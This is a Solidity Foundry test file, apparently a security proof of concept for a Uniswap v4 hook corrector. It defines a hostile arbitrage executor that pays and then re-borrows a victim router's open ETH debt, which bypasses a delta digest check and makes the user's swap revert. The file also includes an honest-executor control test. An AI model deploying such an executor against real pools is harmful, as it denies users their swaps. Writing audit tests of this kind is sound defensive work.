// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

import {Vm} from "forge-std/Vm.sol";
import {ExtensionCampaignBase} from "frontier-test/ExtensionCampaignBase.sol";
import {MockBCToken} from "frontier-test/ProtocolMocks.sol";
import {IFactoryHook} from "frontier/interfaces/IFactoryHook.sol";
import {IWETH} from "frontier/interfaces/IWETH.sol";

import {HookPayload} from "kit/HookPayload.sol";

import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";
import {IWthCorrector} from "contracts/wth-corrector/IWthCorrector.sol";
import {WthCorrector} from "contracts/wth-corrector/WthCorrector.sol";

/// Router with a debt open before the Frontier hop (flash take, then swap, then settle everything).
contract FlashThenSwapRouter is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;

    constructor(IPoolManager _pm) {
        pm = _pm;
    }

    receive() external payable {}

    function run(PoolKey memory key, uint256 borrow, uint256 ethIn) external payable {
        pm.unlock(abi.encode(key, borrow, ethIn));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        (PoolKey memory key, uint256 borrow, uint256 ethIn) = abi.decode(data, (PoolKey, uint256, uint256));
        pm.take(CurrencyLibrary.ADDRESS_ZERO, address(this), borrow);
        BalanceDelta d = pm.swap(
            key,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethIn), sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            ""
        );
        // settle the full open ETH debt, read from the manager like V4Router SETTLE_ALL
        int256 ethDelta = pm.currencyDelta(address(this), CurrencyLibrary.ADDRESS_ZERO);
        if (ethDelta < 0) pm.settle{value: uint256(-ethDelta)}();
        pm.take(key.currency1, address(this), uint256(uint128(d.amount1())));
        return "";
    }
}

contract DeltaSwapExecutor is IWthArbitrageExecutor {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable pm;
    IWETH public immutable weth;
    address public immutable corrector;
    address public victim;
    uint256 public pay;
    bool public hostile;

    constructor(IPoolManager _pm, IWETH _weth, address _corrector) {
        pm = _pm;
        weth = _weth;
        corrector = _corrector;
    }

    receive() external payable {}

    function set(address _victim, uint256 _pay, bool _hostile) external {
        victim = _victim;
        pay = _pay;
        hostile = _hostile;
    }

    function executeArbitrage(PoolKey calldata, address, ProfitSplit calldata) external returns (uint256) {
        if (hostile) {
            int256 owed = pm.currencyDelta(victim, CurrencyLibrary.ADDRESS_ZERO);
            if (owed < 0) {
                // pay the victim's debt, then borrow the same amount back: nonzero count unchanged
                pm.settleFor{value: uint256(-owed)}(victim);
                pm.take(CurrencyLibrary.ADDRESS_ZERO, address(this), uint256(-owed));
            }
        }
        weth.deposit{value: pay}();
        weth.transfer(corrector, pay);
        return 0;
    }
}

contract DigestBypassTest is ExtensionCampaignBase {
    using HookPayload for IFactoryHook.HookConfigV2;

    uint16 internal constant LP_BPS = 3000;
    uint256 internal constant MIN_GAS = 250_000;
    uint256 internal constant MIN_PAYMENT = 1e12;

    WthCorrector internal corrector;
    DeltaSwapExecutor internal executor;
    FlashThenSwapRouter internal router;
    MockBCToken internal wCoin;
    PoolId internal pid;
    PoolKey internal key;

    function setUp() public override {
        super.setUp();
        corrector = new WthCorrector(address(factory), poolManager, address(weth), MIN_GAS, MIN_PAYMENT);
        (wCoin, pid) = _deployGraduated(
            HookPayload.withFee(3000).addCalculator(address(corrector), abi.encode(TICK_SPACING, LP_BPS))
                .addObserver(address(corrector), HookPayload.CALL_AFTER_SWAP, abi.encode(TICK_SPACING, LP_BPS)),
            false
        );
        key = _poolKey(address(wCoin));
        executor = new DeltaSwapExecutor(poolManager, IWETH(address(weth)), address(corrector));
        vm.prank(users.owner);
        corrector.setExecutor(address(executor));
        vm.deal(address(executor), 100 ether);
        router = new FlashThenSwapRouter(poolManager);
        vm.deal(address(router), 10 ether);
    }

    function test_control_honestExecutor_swapCompletes() public {
        executor.set(address(router), MIN_PAYMENT, false);
        vm.recordLogs();
        router.run(key, 0.1 ether, 0.3 ether);
        assertEq(_countLogs(address(corrector), IWthCorrector.CorrectionSettled.selector), 1, "settled");
        assertGt(wCoin.balanceOf(address(router)), 0, "router got coins");
    }

    function test_hostileExecutor_passesDigest_butRevertsUserSwap() public {
        executor.set(address(router), MIN_PAYMENT, true);
        vm.expectRevert();
        router.run(key, 0.1 ether, 0.3 ether);
    }

    /// Without a prior debt the same executor cannot pass the digest and the swap completes.
    function test_hostileExecutor_noPriorDebt_swapCompletes() public {
        executor.set(address(router), MIN_PAYMENT, true);
        vm.recordLogs();
        router.run(key, 0, 0.3 ether);
        assertGt(wCoin.balanceOf(address(router)), 0, "router got coins");
    }

    function _countLogs(address emitter, bytes32 topic) internal returns (uint256 n) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == emitter && logs[i].topics[0] == topic) ++n;
        }
    }
}
